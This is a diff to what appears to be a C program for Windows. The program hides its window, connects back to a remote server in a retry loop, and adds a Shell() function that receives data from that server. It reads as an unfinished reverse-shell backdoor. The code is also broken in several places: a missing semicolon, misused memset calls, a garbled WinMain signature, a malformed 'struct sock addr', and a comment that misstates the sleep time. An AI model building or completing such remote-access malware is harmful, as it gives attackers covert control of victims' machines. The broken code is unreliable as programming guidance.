@@ -10,7 +10,24 @@
 #include <sys/stat.h>
 #include <sys/tapes.h>
 
+
 int sock;
+
+void Shell() {
+    char *buffer = malloc(sizeof(char)*1024);
+    char *container = malloc(sizeof(char)*1024);
+    char *totalResponse = malloc(sizeof(char)*18384)
+
+    while(1) {
+        //set all values to 0
+        memset(&buffer, 0, 1024);
+        memset(&container, 0, 1024);
+        memset(&totalResponse, 0, 18384);
+
+        //recive from the server
+        recv(sock, buffer, 1024, 0);
+    }
+}
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, int nCmdShow) {
     HWND stealth; //window handle
@@ -43,4 +60,5 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, in
     while(connect(sock, (struct sock addr *) &ServAddr, sizeof(ServAddr)) != 0) {
         Sleep(10); //wait 10 sec
     }
+    Shell();
 }
